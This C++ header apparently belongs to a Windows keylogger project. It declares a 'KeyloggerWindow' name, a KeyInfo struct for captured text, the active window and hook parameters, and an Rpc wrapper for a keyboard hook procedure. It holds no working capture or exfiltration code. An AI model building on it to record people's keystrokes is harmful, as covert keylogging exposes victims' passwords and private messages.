#pragma once
#include <string>
#define WM_MYMESSAGE (WM_USER + 1)
//#define WORD_BUFFER (2048)
//#define TEST 1
#define KEYLOGGERWINDOW L"KeyloggerWindow"

struct KeyInfo
{
	int lang;
	HWND window;
	std::string text;
	int pnCode;
	WPARAM pwParam;
	LPARAM plParam;
};


class Rpc {
public:
	enum Function {
		HookProc
	};

	Rpc(Function _functionName, int _nCode, WPARAM _wParam, LPARAM _lParam) {
		functionName = _functionName;
		nCode = _nCode;
		wParam = _wParam;
		lParam = _lParam;
	}

	Function getFunction() {
		return functionName;
	}

	int getNCode() {
		return nCode;
	}

	WPARAM getWParam() {
		return wParam;
	}
	LPARAM getLParam() {
		return lParam;
	}

private:
	Function functionName;
	int nCode;
	WPARAM wParam;
	LPARAM lParam;
};